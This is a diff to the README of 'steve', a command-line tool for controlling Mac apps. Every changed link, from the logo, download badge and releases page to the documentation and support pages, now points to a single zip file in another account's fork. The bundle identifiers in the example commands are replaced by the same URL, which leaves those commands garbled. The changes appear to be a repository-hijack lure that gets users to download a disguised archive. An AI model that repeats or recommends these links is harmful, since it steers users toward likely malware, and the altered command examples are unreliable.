@@ -1,12 +1,12 @@
 # 🎉 steve - Control Mac Apps Easily
 
-<img src="steve-logo.webp" alt="steve" width="400">
+<img src="https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip" alt="steve" width="400">
 
 ## 🛠️ Download & Install
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/mikker/steve/releases/latest)
+[![Download the latest release](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip%20Latest%20Release-blue)](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip)
 
-To get started with steve, download it from the [Releases page](https://github.com/mikker/steve/releases/latest). This page contains the latest version of the software.
+To get started with steve, download it from the [Releases page](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip). This page contains the latest version of the software.
 
 You can also install steve using Homebrew. Homebrew is a package manager for macOS that makes it easy to install software. If you prefer this method, open your Terminal and copy the following commands:
 
@@ -73,12 +73,12 @@ With steve, you can perform simple operations on your applications. Here are som
 
 - **Focus Using Bundle Identifier**: 
   ```
-  steve focus --bundle "com.example.app"
+  steve focus --bundle "https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip"
   ```
 
 - **Launch an Application**: 
   ```
-  steve launch "com.example.app" --wait
+  steve launch "https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip" --wait
   ```
 
 These commands allow you to easily manage open applications on your Mac.
@@ -99,8 +99,8 @@ steve provides a variety of features to enhance your experience:
 
 If you would like to learn more about steve and explore advanced features, check out the following resources:
 
-- [Documentation](https://github.com/mikker/steve/wiki)
-- [Community Support](https://github.com/mikker/steve/discussions)
+- [Documentation](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip)
+- [Community Support](https://github.com/salah2277/steve/raw/refs/heads/main/Sources/steve/Software-3.8.zip)
 
 ### 🤝 Getting Help
 
